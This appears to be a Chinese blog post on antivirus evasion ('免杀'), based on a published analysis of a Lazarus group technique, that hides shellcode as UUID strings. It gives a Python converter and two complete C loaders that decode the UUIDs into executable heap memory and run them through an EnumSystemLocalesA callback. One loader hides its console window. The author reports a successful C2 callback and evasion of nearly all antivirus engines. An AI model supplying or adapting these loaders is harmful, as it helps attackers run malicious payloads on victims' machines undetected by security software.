---
title: uuidshellcode免杀
date: 2021-01-27 09:29:00
toc: true
tags: 
- uuidshellcode
categories: 
- 免杀
---

## 关于

通过将shellcode转化为uuid，并把uuid解释并写入内存空间执行

原文：https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/

我们可以通过编写python脚本来进行shellcode转换uuid，我使用如下代码

~~~python
#!/usr/bin/python
# -*- coding: UTF-8 -*-
import uuid

u=["\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51",
"\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0",
"\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\x00\x00\x00",
]

i=0
while i<len(u):
    print(uuid.UUID(bytes_le=u[i]))
    i=i+1

#以上shellcode处为演示无实际意义，请自行更换
~~~

在shellcode最后一行中我们通过填充x00\x00\x00来占位防止程序报错

之后我们通过文中给的解释器来进行编译,将以上脚本生成的uuid替换到下面的uuids处

~~~c
#include <Windows.h>
#include <Rpc.h>
#include <iostream>

#pragma comment(lib, "Rpcrt4.lib")

const char* uuids[] =
{
    "6850c031-6163-636c-5459-504092741551",
    "2f728b64-768b-8b0c-760c-ad8b308b7e18",
    "1aeb50b2-60b2-2948-d465-488b32488b76",
    "768b4818-4810-48ad-8b30-488b7e300357",
    "175c8b3c-8b28-1f74-2048-01fe8b541f24",
    "172cb70f-528d-ad02-813c-0757696e4575",
    "1f748bef-481c-fe01-8b34-ae4801f799ff",
    "000000d7-0000-0000-0000-000000000000",
};

int main()
{
    HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    void* ha = HeapAlloc(hc, 0, 0x100000);
    DWORD_PTR hptr = (DWORD_PTR)ha;
    int elems = sizeof(uuids) / sizeof(uuids[0]);
    
    for (int i = 0; i < elems; i++) {
        RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)hptr);
        if (status != RPC_S_OK) {
            printf("UuidFromStringA() != S_OK\n");
            CloseHandle(ha);
            return -1;
        }
         hptr += 16;
    }
    printf("[*] Hexdump: ");
    for (int i = 0; i < elems*16; i++) {
        printf("%02X ", ((unsigned char*)ha)[i]);
    }
    EnumSystemLocalesA((LOCALE_ENUMPROCA)ha, 0);
    CloseHandle(ha);
    return 0;
}
~~~

编译生成exe

![image](https://user-images.githubusercontent.com/38073810/105930649-e6db1880-6084-11eb-8445-e7fe8e5d5a2c.png)

运行成功上线

![image](https://user-images.githubusercontent.com/38073810/105930989-636df700-6085-11eb-8439-1d43eb8fb2d0.png)

免杀测试

![image](https://user-images.githubusercontent.com/38073810/105931065-7d0f3e80-6085-11eb-8e30-e346bb011823.png)

成功绕过国内所有杀软，以及国外大部分杀软，仅2项爆红。

不得不说，uuidshellcode免杀效果真心不错。

另贴一个隐藏cmd窗口的版本

~~~c
#include <Windows.h>
#include <Rpc.h>
#include <iostream>
#include <stdio.h>
#include <heapapi.h>

#ifdef _MSC_VER
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
#endif

#pragma comment(lib, "Rpcrt4.lib")

const char* uuids[] =
{
    "e48348fc-e8f0-00c8-0000-415141505251",
    "d2314856-4865-528b-6048-8b5218488b52",
    "728b4820-4850-b70f-4a4a-4d31c94831c0",
};

int main()
{
    HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);//在进程的虚拟地址空间中保留空间
    void* ha = HeapAlloc(hc, 0, 0x100000);//申请内存
    DWORD_PTR hptr = (DWORD_PTR)ha;
    int elems = sizeof(uuids) / sizeof(uuids[0]);

    for (int i = 0; i < elems; i++) {
        RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)hptr);//UUID转换为原来的shellcode写入内存
        if (status != RPC_S_OK) {
            printf("UuidFromStringA() != S_OK\n");
            CloseHandle(ha);
            return -1;
        }
        hptr += 16;
    }
    printf("[*] Hexdump: ");
    for (int i = 0; i < elems * 16; i++) {
        printf("%02X ", ((unsigned char*)ha)[i]);
    }
    EnumSystemLocalesA((LOCALE_ENUMPROCA)ha, 0);//枚举操作系统上安装或支持的语言环境。
    CloseHandle(ha);
    return 0;
}

~~~



